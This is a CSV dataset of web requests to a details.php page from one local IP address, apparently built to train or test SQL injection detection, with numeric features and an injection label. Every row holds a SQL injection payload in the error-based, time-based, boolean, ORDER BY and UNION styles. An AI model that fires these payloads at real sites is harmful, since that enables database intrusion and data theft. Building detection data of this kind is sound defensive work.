full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5%20OR%20GTID_SUBSET%28CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%283235%3D3235%2C1%29%29%29%2C0x717a626271%29%2C3235%29&type=%3F,"/details.php?prod=5 OR GTID_SUBSET(CONCAT(0x71717a6271,(SELECT (ELT(3235=3235,1))),0x717a626271),3235)&type=?",192.168.43.6,1681395107.860414,3,85,3.5,4,8.235294117647058,1
/details.php?prod=5%20AND%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%289548%3D9548%2C1%29%29%29%2C0x717a626271%29%29%20USING%20utf8%29%29%29&type=%3F,"/details.php?prod=5 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(9548=9548,1))),0x717a626271)) USING utf8)))&type=?",192.168.43.6,1681395107.865954,3,117,3.5,4,5.982905982905983,1
/details.php?prod=5%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281079%3D1079%2C1%29%29%29%2C0x717a626271%29%29%20USING%20utf8%29%29%29&type=%3F,"/details.php?prod=5 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71717a6271,(SELECT (ELT(1079=1079,1))),0x717a626271)) USING utf8)))&type=?",192.168.43.6,1681395107.915821,3,116,3.5,4,6.0344827586206895,1
/details.php?prod=5%20AND%20%28SELECT%202695%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%282695%3D2695%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29&type=%3F,"/details.php?prod=5 AND (SELECT 2695 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(2695=2695,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&type=?",192.168.43.6,1681395107.9238,6,166,3.5,4,6.024096385542169,1
/details.php?prod=%28SELECT%20CONCAT%280x71717a6271%2C%28ELT%287404%3D7404%2C1%29%29%2C0x717a626271%29%29&type=%3F,"/details.php?prod=(SELECT CONCAT(0x71717a6271,(ELT(7404=7404,1)),0x717a626271))&type=?",192.168.43.6,1681395107.99244,1,62,3.5,4,8.064516129032258,1
/details.php?prod=5%3BSELECT%20SLEEP%285%29%23&type=%3F,/details.php?prod=5;SELECT SLEEP(5)#&type=?,192.168.43.6,1681395108.125221,1,19,3.5,5,31.57894736842105,1
/details.php?prod=5%3BSELECT%20SLEEP%285%29&type=%3F,/details.php?prod=5;SELECT SLEEP(5)&type=?,192.168.43.6,1681395108.130078,1,18,3.5,4,27.77777777777778,1
/details.php?prod=5%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29FPnP%29%23&type=%3F,/details.php?prod=5;(SELECT * FROM (SELECT(SLEEP(5)))FPnP)#&type=?,192.168.43.6,1681395108.135564,2,42,3.5,5,16.666666666666668,1
/details.php?prod=5%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29lJKS%29&type=%3F,/details.php?prod=5;(SELECT * FROM (SELECT(SLEEP(5)))lJKS)&type=?,192.168.43.6,1681395108.183169,2,41,3.5,4,14.634146341463415,1
/details.php?prod=5%3BSELECT%20BENCHMARK%285000000%2CMD5%280x494e6e6a%29%29%23&type=%3F,"/details.php?prod=5;SELECT BENCHMARK(5000000,MD5(0x494e6e6a))#&type=?",192.168.43.6,1681395108.200088,1,45,3.5,6,15.555555555555555,1
/details.php?prod=5%3BSELECT%20BENCHMARK%285000000%2CMD5%280x734e4475%29%29&type=%3F,"/details.php?prod=5;SELECT BENCHMARK(5000000,MD5(0x734e4475))&type=?",192.168.43.6,1681395108.254675,1,44,3.5,5,13.636363636363637,1
/details.php?prod=5%20AND%20%28SELECT%201875%20FROM%20%28SELECT%28SLEEP%285%29%29%29GZCk%29&type=%3F,/details.php?prod=5 AND (SELECT 1875 FROM (SELECT(SLEEP(5)))GZCk)&type=?,192.168.43.6,1681395108.263182,3,48,3.5,3,12.5,1
/details.php?prod=5%20AND%20%28SELECT%201875%20FROM%20%28SELECT%28SLEEP%280%29%29%29GZCk%29&type=%3F,/details.php?prod=5 AND (SELECT 1875 FROM (SELECT(SLEEP(0)))GZCk)&type=?,192.168.43.6,1681395113.272197,3,48,3.5,3,12.5,1
/details.php?prod=5%20AND%20%28SELECT%201875%20FROM%20%28SELECT%28SLEEP%285%29%29%29GZCk%29&type=%3F,/details.php?prod=5 AND (SELECT 1875 FROM (SELECT(SLEEP(5)))GZCk)&type=?,192.168.43.6,1681395113.276668,3,48,3.5,3,12.5,1
/details.php?prod=5%20ORDER%20BY%201--%20-&type=%3F,/details.php?prod=5 ORDER BY 1-- -&type=?,192.168.43.6,1681395118.289277,2,17,97.8,2,23.529411764705884,1
/details.php?prod=5%20ORDER%20BY%206660--%20-&type=%3F,/details.php?prod=5 ORDER BY 6660-- -&type=?,192.168.43.6,1681395118.293718,2,20,97.8,2,20.0,1
/details.php?prod=5%20ORDER%20BY%2010--%20-&type=%3F,/details.php?prod=5 ORDER BY 10-- -&type=?,192.168.43.6,1681395118.298958,2,18,97.8,2,22.22222222222222,1
/details.php?prod=5%20ORDER%20BY%206--%20-&type=%3F,/details.php?prod=5 ORDER BY 6-- -&type=?,192.168.43.6,1681395118.320209,2,17,97.8,2,23.529411764705884,1
/details.php?prod=5%20ORDER%20BY%204--%20-&type=%3F,/details.php?prod=5 ORDER BY 4-- -&type=?,192.168.43.6,1681395118.329546,2,17,97.8,2,23.529411764705884,1
/details.php?prod=5%20ORDER%20BY%205--%20-&type=%3F,/details.php?prod=5 ORDER BY 5-- -&type=?,192.168.43.6,1681395118.33392,2,17,97.8,2,23.529411764705884,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71717a6271%2C0x7a65756a6c4d7269496a54776f67674e4e6f7054706f524979494d6975756d63625369654c4e6574%2C0x717a626271%29%2CNULL%2CNULL%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,CONCAT(0x71717a6271,0x7a65756a6c4d7269496a54776f67674e4e6f7054706f524979494d6975756d63625369654c4e6574,0x717a626271),NULL,NULL,NULL-- -&type=?",192.168.43.6,1681395118.343668,4,160,97.8,5,5.625,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x71717a6271%2C0x4e5273787954675343546b4543727167475466436568454f774178634e6b656b587573414479754f%2C0x717a626271%29%2CNULL%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,CONCAT(0x71717a6271,0x4e5273787954675343546b4543727167475466436568454f774178634e6b656b587573414479754f,0x717a626271),NULL,NULL-- -&type=?",192.168.43.6,1681395118.349722,4,160,97.8,5,5.625,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C0x65785659765550636e75664874526749716346765a4f4f58446f796a4147707a67504e534a785373%2C0x717a626271%29%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71717a6271,0x65785659765550636e75664874526749716346765a4f4f58446f796a4147707a67504e534a785373,0x717a626271),NULL-- -&type=?",192.168.43.6,1681395118.362147,4,160,97.8,5,5.625,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20CONCAT%280x71717a6271%2C0x4e4b727650575a7174595159706e497572426862596642416175746345436b4873704f6f70544d6f%2C0x717a626271%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT CONCAT(0x71717a6271,0x4e4b727650575a7174595159706e497572426862596642416175746345436b4873704f6f70544d6f,0x717a626271),NULL,NULL,NULL,NULL-- -&type=?",192.168.43.6,1681395118.372366,4,160,97.8,5,5.625,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C0x63497454717a67716b757a47444d47536146724166727470544a766c47516b5a5173437659785974%2C0x717a626271%29--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71717a6271,0x63497454717a67716b757a47444d47536146724166727470544a766c47516b5a5173437659785974,0x717a626271)-- -&type=?",192.168.43.6,1681395118.377464,4,160,97.8,5,5.625,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71717a6271%2C0x6b536c724c784c794f51%2C0x717a626271%29%2CNULL%2CNULL%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,CONCAT(0x71717a6271,0x6b536c724c784c794f51,0x717a626271),NULL,NULL,NULL-- -&type=?",192.168.43.6,1681395118.411063,4,100,97.8,5,9.0,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x71717a6271%2C0x544277666a7353774f67%2C0x717a626271%29%2CNULL%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,CONCAT(0x71717a6271,0x544277666a7353774f67,0x717a626271),NULL,NULL-- -&type=?",192.168.43.6,1681395118.417501,4,100,97.8,5,9.0,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C0x7662684e736348437059%2C0x717a626271%29%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71717a6271,0x7662684e736348437059,0x717a626271),NULL-- -&type=?",192.168.43.6,1681395118.481401,4,100,97.8,5,9.0,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20CONCAT%280x71717a6271%2C0x416e50517173674b784e%2C0x717a626271%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT CONCAT(0x71717a6271,0x416e50517173674b784e,0x717a626271),NULL,NULL,NULL,NULL-- -&type=?",192.168.43.6,1681395118.543434,4,100,97.8,5,9.0,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C0x4572706a674855436d64%2C0x717a626271%29--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71717a6271,0x4572706a674855436d64,0x717a626271)-- -&type=?",192.168.43.6,1681395118.54865,4,100,97.8,5,9.0,1
/details.php?prod=-2058%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71717a6271%2C0x506d66476f456a657a627a526a5059615562657455436e647444566954537568566b5254616f7662%2C0x717a626271%29%2CNULL%2CNULL%2CNULL--%20-&type=%3F,"/details.php?prod=-2058 UNION ALL SELECT NULL,CONCAT(0x71717a6271,0x506d66476f456a657a627a526a5059615562657455436e647444566954537568566b5254616f7662,0x717a626271),NULL,NULL,NULL-- -&type=?",192.168.43.6,1681395118.558081,4,164,97.8,5,5.487804878048781,1
/details.php?prod=-7371%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C0x5653424a417755614d564275445672766a7552504e5468686a4b6d4c7a564e536b46586d71476e66%2C0x717a626271%29--%20-&type=%3F,"/details.php?prod=-7371 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71717a6271,0x5653424a417755614d564275445672766a7552504e5468686a4b6d4c7a564e536b46586d71476e66,0x717a626271)-- -&type=?",192.168.43.6,1681395118.612434,4,164,97.8,5,5.487804878048781,1
/details.php?prod=-2416%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C%28CASE%20WHEN%20%284365%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%204365%29%20THEN%201%20ELSE%200%20END%29%2C0x717a626271%29--%20-&type=%3F,"/details.php?prod=-2416 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71717a6271,(CASE WHEN (4365=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                4365) THEN 1 ELSE 0 END),0x717a626271)-- -&type=?",192.168.43.6,1681395118.632125,6,635,97.8,5,1.7322834645669292,1
/details.php?prod=5&type=8429,/details.php?prod=5&type=8429,192.168.43.6,1681395120.600657,0,5,97.8,1,20.0,1
/details.php?prod=5&type=%3F.%2C%29.%2C%2C%28%22.%27,"/details.php?prod=5&type=?.,).,,("".'",192.168.43.6,1681395120.606028,0,13,97.8,6,46.15384615384615,1
/details.php?prod=5&type=%3F%27DjwSfm%3C%27%22%3EyFLhiq,"/details.php?prod=5&type=?'DjwSfm<'"">yFLhiq",192.168.43.6,1681395120.611527,0,21,97.8,3,14.285714285714286,1
/details.php?prod=5&type=%3F%29%20AND%204518%3D1491--%20ebZB,/details.php?prod=5&type=?) AND 4518=1491-- ebZB,192.168.43.6,1681395120.718613,1,24,97.8,3,16.666666666666668,1
/details.php?prod=5&type=%3F%29%20AND%205104%3D5104--%20KXCL,/details.php?prod=5&type=?) AND 5104=5104-- KXCL,192.168.43.6,1681395120.730996,1,24,97.8,3,16.666666666666668,1
/details.php?prod=5&type=%3F%27%29%20AND%202383%3D8695--%20fEnt,/details.php?prod=5&type=?') AND 2383=8695-- fEnt,192.168.43.6,1681395120.735791,1,25,97.8,4,20.0,1
/details.php?prod=5&type=%3F%27%29%20AND%205104%3D5104--%20QLaa,/details.php?prod=5&type=?') AND 5104=5104-- QLaa,192.168.43.6,1681395120.792663,1,25,97.8,4,20.0,1
/details.php?prod=5&type=%3F%27%20AND%209764%3D1701--%20zKmQ,/details.php?prod=5&type=?' AND 9764=1701-- zKmQ,192.168.43.6,1681395120.797465,1,24,97.8,3,16.666666666666668,1
/details.php?prod=5&type=%3F%27%20AND%205104%3D5104--%20gxKU,/details.php?prod=5&type=?' AND 5104=5104-- gxKU,192.168.43.6,1681395120.802544,1,24,97.8,3,16.666666666666668,1
/details.php?prod=5&type=%3F%22%20AND%205333%3D2454--%20PSuP,"/details.php?prod=5&type=?"" AND 5333=2454-- PSuP",192.168.43.6,1681395120.865,1,24,97.8,3,16.666666666666668,1
/details.php?prod=5&type=%3F%22%20AND%205104%3D5104--%20DNhI,"/details.php?prod=5&type=?"" AND 5104=5104-- DNhI",192.168.43.6,1681395120.870335,1,24,97.8,3,16.666666666666668,1
/details.php?prod=5&type=%3F%29%20AND%202096%3D6452%20AND%20%284056%3D4056,/details.php?prod=5&type=?) AND 2096=6452 AND (4056=4056,192.168.43.6,1681395120.87643,1,32,97.8,3,12.5,1
/details.php?prod=5&type=%3F%29%20AND%205104%3D5104%20AND%20%286402%3D6402,/details.php?prod=5&type=?) AND 5104=5104 AND (6402=6402,192.168.43.6,1681395120.938336,1,32,97.8,3,12.5,1
/details.php?prod=5&type=%3F%29%29%20AND%201535%3D6860%20AND%20%28%288677%3D8677,/details.php?prod=5&type=?)) AND 1535=6860 AND ((8677=8677,192.168.43.6,1681395120.997679,1,34,97.8,3,11.764705882352942,1
/details.php?prod=5&type=%3F%29%29%20AND%205104%3D5104%20AND%20%28%289761%3D9761,/details.php?prod=5&type=?)) AND 5104=5104 AND ((9761=9761,192.168.43.6,1681395121.002116,1,34,97.8,3,11.764705882352942,1
/details.php?prod=5&type=%3F%29%29%29%20AND%205675%3D6106%20AND%20%28%28%283678%3D3678,/details.php?prod=5&type=?))) AND 5675=6106 AND (((3678=3678,192.168.43.6,1681395121.006055,1,36,97.8,3,11.11111111111111,1
/details.php?prod=5&type=%3F%29%29%29%20AND%205104%3D5104%20AND%20%28%28%284939%3D4939,/details.php?prod=5&type=?))) AND 5104=5104 AND (((4939=4939,192.168.43.6,1681395121.009066,1,36,97.8,3,11.11111111111111,1
/details.php?prod=5&type=%3F%20AND%204929%3D5154,/details.php?prod=5&type=? AND 4929=5154,192.168.43.6,1681395121.013405,1,16,97.8,1,12.5,1
/details.php?prod=5&type=%3F%20AND%205104%3D5104,/details.php?prod=5&type=? AND 5104=5104,192.168.43.6,1681395121.061311,1,16,97.8,1,12.5,1
/details.php?prod=5&type=%3F%27%29%20AND%207884%3D2455%20AND%20%28%27BLVX%27%3D%27BLVX,/details.php?prod=5&type=?') AND 7884=2455 AND ('BLVX'='BLVX,192.168.43.6,1681395121.065082,1,36,97.8,4,13.88888888888889,1
/details.php?prod=5&type=%3F%27%29%20AND%205104%3D5104%20AND%20%28%27KcWD%27%3D%27KcWD,/details.php?prod=5&type=?') AND 5104=5104 AND ('KcWD'='KcWD,192.168.43.6,1681395121.069974,1,36,97.8,4,13.88888888888889,1
/details.php?prod=5&type=%3F%27%29%29%20AND%205401%3D5219%20AND%20%28%28%27JfIK%27%3D%27JfIK,/details.php?prod=5&type=?')) AND 5401=5219 AND (('JfIK'='JfIK,192.168.43.6,1681395121.075137,1,38,97.8,4,13.157894736842104,1
/details.php?prod=5&type=%3F%27%29%29%20AND%205104%3D5104%20AND%20%28%28%27upML%27%3D%27upML,/details.php?prod=5&type=?')) AND 5104=5104 AND (('upML'='upML,192.168.43.6,1681395121.078728,1,38,97.8,4,13.157894736842104,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%205429%3D3904%20AND%20%28%28%28%27slbH%27%3D%27slbH,/details.php?prod=5&type=?'))) AND 5429=3904 AND ((('slbH'='slbH,192.168.43.6,1681395121.082896,1,40,97.8,4,12.5,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%205104%3D5104%20AND%20%28%28%28%27CWZH%27%3D%27CWZH,/details.php?prod=5&type=?'))) AND 5104=5104 AND ((('CWZH'='CWZH,192.168.43.6,1681395121.088536,1,40,97.8,4,12.5,1
/details.php?prod=5&type=%3F%27%20AND%201405%3D6623%20AND%20%27uLNg%27%3D%27uLNg,/details.php?prod=5&type=?' AND 1405=6623 AND 'uLNg'='uLNg,192.168.43.6,1681395121.092646,1,34,97.8,2,8.823529411764707,1
/details.php?prod=5&type=%3F%27%20AND%205104%3D5104%20AND%20%27oYMl%27%3D%27oYMl,/details.php?prod=5&type=?' AND 5104=5104 AND 'oYMl'='oYMl,192.168.43.6,1681395121.09645,1,34,97.8,2,8.823529411764707,1
/details.php?prod=5&type=%3F%27%29%20AND%203479%3D7998%20AND%20%28%27yyoM%27%20LIKE%20%27yyoM,/details.php?prod=5&type=?') AND 3479=7998 AND ('yyoM' LIKE 'yyoM,192.168.43.6,1681395121.100963,2,41,97.8,4,14.634146341463415,1
/details.php?prod=5&type=%3F%27%29%20AND%205104%3D5104%20AND%20%28%27Geve%27%20LIKE%20%27Geve,/details.php?prod=5&type=?') AND 5104=5104 AND ('Geve' LIKE 'Geve,192.168.43.6,1681395121.104047,2,41,97.8,4,14.634146341463415,1
